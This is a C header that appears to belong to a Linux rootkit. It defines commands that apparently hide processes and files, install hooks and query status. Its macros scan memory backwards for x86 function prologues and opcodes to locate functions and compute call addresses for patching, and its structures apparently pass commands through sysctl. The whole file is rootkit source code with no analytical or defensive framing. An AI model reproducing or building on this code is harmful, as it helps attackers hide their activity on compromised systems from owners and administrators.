#ifndef __BD_H
#define __BD_H

#include "../include/arch.h"

#ifdef __AMD64__
#define PT_DISP   10
#endif

#ifdef __IA32__
#define PT_DISP    6
#endif

#define RKHPID     1
#define RKUHFILE   4
#define RKHOOK     6
#define RKSTAT    10

#define MMAP_BASE 0x30000000
#define CALLADDR(ptr, off, val) ((*(unsigned long *)val)=(base+(ptr-map)+(off+5)))

/* backtrack to c */
#define BACKCHR(p,c) \
do {                 \
    while (*p != c)  \
        p--;         \
} while (0)

/* backtrack to function prolog */
#define EBP(p,val)               \
do {                             \
    while (1) {                  \
        while (*p != '\xe5')     \
            p--;                 \
        p--;                     \
        if (*p == '\x89')        \
            break;               \
    }                            \
    p--;                         \
    while (*p != '\x55')         \
        p--;                     \
    (*val) = base+(p-map);       \
} while (0)

/* backtrack to prolog with -fomit-frame-pointer */
#define SUBESP(p,val)            \
do {                             \
    while (1) {                  \
        while (*p != '\x83')     \
            p--;                 \
        if (*(p+1) == '\xec')    \
            break;               \
        p--;                     \
    }                            \
    (*val) = base+(p-map);       \
} while (0)

/* advance to test %reg, %reg */
#define TESTOP(p)                \
do {                             \
    while (1) {                  \
        while (*p != '\x85')     \
            p++;                 \
        switch (*(p+1)) {        \
            case '\xc0':         \
            case '\xdb':         \
            case '\xc9':         \
            case '\xd2':         \
            case '\xf6':         \
            case '\xff':         \
                break;           \
            default:             \
                p += 1;          \
                continue;        \
        }                        \
        break;                   \
    }                            \
} while (0)

#define EBX2(calladdr)           \
do {                             \
    calladdr = ebx-calladdr;     \
    calladdr = (~calladdr)+1;    \
} while(0)

#define GOTOFF(calladdr) (!base ? ((ebx-(~calladdr)-1)) : calladdr)
#define BASEOFF(f) (map+(f-base))
#define JMP(p) (p = (*(p+1)+2))

struct rkargs {
	unsigned  int cmd;
	unsigned  int arg;
};

#define CTL_KERN 1

struct sysctl_args {
        int *name;
        int nlen;
        void *oldval;
        unsigned long *oldlenp;
        void *newval;
        unsigned long newlen;
        unsigned long __unused[4];
};

#endif
